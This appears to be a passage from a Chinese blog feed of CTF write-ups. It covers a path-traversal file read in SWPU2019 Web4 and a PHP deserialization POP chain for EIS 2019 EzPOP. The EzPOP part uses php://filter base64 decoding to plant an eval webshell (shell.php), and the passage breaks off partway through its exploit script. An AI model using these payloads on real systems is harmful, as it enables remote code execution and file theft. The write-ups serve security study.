class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>多试几次，跑出来是<code>glzjin_wants_a_girl_friend.zip</code></p><p>下载下来，MVC框架.</p><h3 id="url大致的解析流程"><a href="#url大致的解析流程" class="headerlink" title="url大致的解析流程"></a>url大致的解析流程</h3><p>从r参数中获取要访问的Controller以及Action,然后以/分隔开后拼接成完整的控制器名。以Login/Index为例，就是将Login/Index分隔开分别拼接成LoginController以及actionIndex,然后调用LoginController这个类中的actionIndex方法。每个action里面会调用对应的loadView()方法进行模版渲染，然后将页面返回给客户端。若访问的Controller不存在则默认解析Login/Index。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPU2019-Web4/image-20210818165518569.png"></p><p>在BaseController.php中，明显这里可以利用<code>extract()</code>进行变量覆盖，于是接下来就要找<code>$viewData</code>在哪可以控制。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPU2019-Web4/image-20210818170822451.png"></p><p>明显，在UserController.php中，<code>$viewData</code>是可控的。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPU2019-Web4/image-20210818171350231.png"></p><p>所以按照url解析流程，</p><pre class="line-numbers language-none"><code class="language-none">index.php?r&#x3D;User&#x2F;Index<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但是直接包含flag.php，还是读取不了里面内容，所以得找其他办法</p><p>在这，正好有转化base64输出的代码可以利用。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPU2019-Web4/image-20210818185340434.png"></p><p>payload</p><pre class="line-numbers language-none"><code class="language-none">img_file&#x3D;&#x2F;..&#x2F;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPU2019-Web4/image-20210818191056981.png"></p><p>解码一下，结束</p><pre class="line-numbers language-none"><code class="language-none">PD9waHAKICAgIGVjaG8gImZsYWcgaXMgaGVyZSxidXQgeW91IG11c3QgdHJ5IHRvIHNlZSBpdC4iOwogICAgJGZsYWcgPSAiZmxhZ3s4MzM0OTMxNS1mNDE3LTRkYTMtOTQ0OS0zM2ZhZjZhNzdmN2V9IjsK<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPU2019-Web4/image-20210818191123627.png"></p><p>在这发现个奇怪的事</p><p>chrome里的hackbar似乎对带有换行的base64解码处理不太好</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPU2019-Web4/image-20210818191201454.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SWPU2019-Web4/image-20210818191210846.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[EIS 2019]EzPOP</title>
      <link href="/p/286731300.html"/>
      <url>/p/286731300.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[反序列化]</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$store</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$key</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$expire</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$store</span><span class="token punctuation">,</span> <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'flysystem'</span><span class="token punctuation">,</span> <span class="token variable">$expire</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span> <span class="token operator">=</span> <span class="token variable">$key</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">store</span> <span class="token operator">=</span> <span class="token variable">$store</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">expire</span> <span class="token operator">=</span> <span class="token variable">$expire</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">cleanContents</span><span class="token punctuation">(</span><span class="token keyword type-hint">array</span> <span class="token variable">$contents</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$cachedProperties</span> <span class="token operator">=</span> <span class="token function">array_flip</span><span class="token punctuation">(</span><span class="token punctuation">[</span>            <span class="token string single-quoted-string">'path'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'dirname'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'basename'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'extension'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'filename'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'size'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mimetype'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'visibility'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'timestamp'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'type'</span><span class="token punctuation">,</span>        <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$contents</span> <span class="token keyword">as</span> <span class="token variable">$path</span> <span class="token operator">=></span> <span class="token variable">$object</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$object</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$contents</span><span class="token punctuation">[</span><span class="token variable">$path</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">array_intersect_key</span><span class="token punctuation">(</span><span class="token variable">$object</span><span class="token punctuation">,</span> <span class="token variable">$cachedProperties</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$contents</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getForStorage</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$cleaned</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">cleanContents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cache</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token variable">$cleaned</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">complete</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$contents</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">getForStorage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">store</span><span class="token operator">-></span><span class="token function">set</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span><span class="token punctuation">,</span> <span class="token variable">$contents</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">expire</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">autosave</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">B</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function-definition function">getExpireTime</span><span class="token punctuation">(</span><span class="token variable">$expire</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">int</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span> <span class="token variable">$expire</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getCacheKey</span><span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'prefix'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function-definition function">serialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span> <span class="token variable">$data</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$serialize</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'serialize'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$serialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">set</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">,</span> <span class="token variable">$expire</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">bool</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">writeTimes</span><span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$expire</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$expire</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'expire'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$expire</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">getExpireTime</span><span class="token punctuation">(</span><span class="token variable">$expire</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">getCacheKey</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">,</span> <span class="token number">0755</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// 创建失败</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data_compress'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'gzcompress'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">//数据压缩</span>            <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">gzcompress</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;?php\n//"</span> <span class="token operator">.</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%012d'</span><span class="token punctuation">,</span> <span class="token variable">$expire</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n exit();?>\n"</span> <span class="token operator">.</span> <span class="token variable">$data</span><span class="token punctuation">;</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'src'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"uploads/"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>反序列题，看代码构造pop链。</p><h3 id="函数解析"><a href="#函数解析" class="headerlink" title="函数解析"></a>函数解析</h3><ul><li><p><code>array_intersect_key</code> 比较键名返回两个集合的交集，以第一个参数为优先</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$a1</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"a"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"red"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"b"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"green"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"c"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"123"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a2</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"a"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"red"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"c"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"blue"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"d"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"pink"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">array_intersect_key</span><span class="token punctuation">(</span><span class="token variable">$a1</span><span class="token punctuation">,</span> <span class="token variable">$a2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Array ( [a] => red [c] => 123 )</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><code>array_flip</code> 反转键值对</p><pre class="line-numbers language-none"><code class="language-none">$cachedProperties &#x3D; array_flip([    &#39;path&#39;, &#39;dirname&#39;]);var_dump($cachedProperties);&#x2F;&#x2F;array(2) &#123; [&quot;path&quot;]&#x3D;&gt; int(0) [&quot;dirname&quot;]&#x3D;&gt; int(1) &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>第一步，先找哪里能输出flag或执行代码的地方。</p><p>很明显，在这里了。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-EIS-2019-EzPOP/image-20210817165436129.png"></p><p>大致pop链如下：</p><pre class="line-numbers language-none"><code class="language-none">B::set() &lt;- A::save() &lt;- A::__destruct()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后得具体构造了</p><p>先看这里：</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-EIS-2019-EzPOP/image-20210817171544413.png"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$expire</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'abcd'</span><span class="token punctuation">;</span><span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%012d'</span><span class="token punctuation">,</span> <span class="token variable">$expire</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$data</span><span class="token punctuation">;</span><span class="token comment">//000000000000</span><span class="token variable">$expire</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'1234'</span><span class="token punctuation">;</span><span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%012d'</span><span class="token punctuation">,</span> <span class="token variable">$expire</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$data</span><span class="token punctuation">;</span><span class="token comment">//000000001234</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里只允许输出数字，所以肯定有漏洞，百度一下，真有</p><p><a href="https://www.cnblogs.com/qingwuyou/p/10687463.html">php sprintf函数漏洞</a></p><p>看了一会，得，实际上这里并不是用这个格式化漏洞，而是直接绕过的。</p><p>可以从<code>$filename</code>入手</p><p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">谈一谈php://filter的妙用</a></p><blockquote><p>PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php">$filename = 'php://filter/write=convert.base64-decode/resource=shell.php';$data = 'PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTsgPz4=';$add_str = '111';$data = "<span class="token php language-php"><span class="token delimiter important">&lt;?</span>php\n<span class="token comment">//" . sprintf('%012d', $expire) . "\n exit();</span><span class="token delimiter important">?></span></span>\n" . $add_str . $data;file_put_contents($filename, $data);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用伪协议，在写入的时候进行base64解码，这样就把前面的<strong>死亡exit</strong>给解码掉了。</p><p>然后发现字符不够，于是一个一个加，加到3个字符就成了。</p><p>base64编码后的字符串字节数都是4的倍数，而表中字符只有[a-zA-z0-9+/]，其他字符是不在编码范围内的</p><p>写个代码测试下</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$s1</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'12'</span><span class="token punctuation">;</span><span class="token variable">$s2</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'12=='</span><span class="token punctuation">;</span><span class="token variable">$b1</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$s1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b2</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$s2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token variable">$b1</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">' '</span> <span class="token operator">.</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token variable">$b2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//OUTPUT:d7 d7</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>明显，解码的时候不足4的倍数会补。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">$data = "<span class="token php language-php"><span class="token delimiter important">&lt;?</span>php\n<span class="token comment">//" . sprintf('%012d', $expire) . "\n exit();</span><span class="token delimiter important">?></span></span>\n"=><span class="token php language-php"><span class="token delimiter important">&lt;?</span>php\n<span class="token comment">//123456789123\n exit();</span><span class="token delimiter important">?></span></span>\n<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>不符合base64编码的字符范围将被忽略,能被解码的只有如下21个字符，所以需要补3个字符。</p><pre class="line-numbers language-none"><code class="language-none">php&#x2F;&#x2F;123456789123exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后这里的$contents就是放webshell的地方，这有两个选择，一是从<code>$cleaned</code>取，一是从<code>$complete</code>里取。明显从<code>$complete</code>里取要简单点，所以这里可以让<code>$cleaned</code>为空或空数组即可。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-EIS-2019-EzPOP/image-20210817221009582.png"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'MTIzNDU='</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//$a = json_encode(['', 'MTIzNDU=']);</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-EIS-2019-EzPOP/image-20210817221607606.png"></p><p>payload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span><span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$store</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$key</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$expire</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">store</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">autosave</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'shell.php'</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cache</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">complete</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'MTExUEQ5d2FIQWdaWFpoYkNna1gxQlBVMVJiSjJOdFpDZGRLVHNnUHo0PQ=='</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">B</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span 